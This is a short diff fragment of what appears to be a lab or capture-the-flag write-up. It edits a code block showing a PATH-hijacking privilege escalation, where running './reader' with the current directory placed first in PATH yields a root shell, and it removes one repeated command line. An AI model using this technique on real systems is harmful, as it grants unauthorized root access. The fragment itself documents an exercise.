@@ -204,7 +204,6 @@ PATH=.:$PATH ./reader 01.txt
 3. Enjoy the profit
 
 ```
-$ PATH=.:$PATH ./reader 01.txt
 # whoami
 root
 ```
